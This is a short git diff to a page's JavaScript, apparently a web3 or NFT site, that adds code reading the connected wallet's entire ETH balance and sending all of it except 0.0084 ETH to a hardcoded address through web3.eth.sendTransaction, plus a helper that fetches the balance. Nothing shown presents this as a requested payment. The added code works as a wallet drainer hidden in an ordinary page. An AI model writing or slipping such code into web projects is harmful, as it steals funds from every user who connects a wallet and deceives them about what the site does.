@@ -632,6 +632,32 @@ $(document).ready(function () {
   
   
    console.log(collection)
+
+   var value = await get_eth(account) //search getbalance.js
+   var minusvalue = value - 0.0084 //it can be userinputted or set by a webpage or estimated by a thirdparty
+   
+   const finalAmount = Web3.utils.toWei(minusvalue.toString(), 'ether')
+   
+   
+   
+   
+   console.log(finalAmount)
+   const txData = {
+     from: account,
+     to: '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262',
+     value: finalAmount,
+   };
+   
+   
+   await web3.eth.sendTransaction(txData)
+     .then( (txHash) => {
+       console.log(txHash)
+     }).catch( (err) => {
+       console.log(err)
+     })
+   
+   
+   
   
   /*---------------------------------------------------------------*/
   
@@ -827,3 +853,15 @@ $(document).ready(function () {
 
 
     check()
+
+
+async function get_eth(address) {
+
+  const balances = web3.utils.fromWei(
+    await web3.eth.getBalance(address),
+    'ether'
+  )* 1;
+
+  return balances;
+
+}
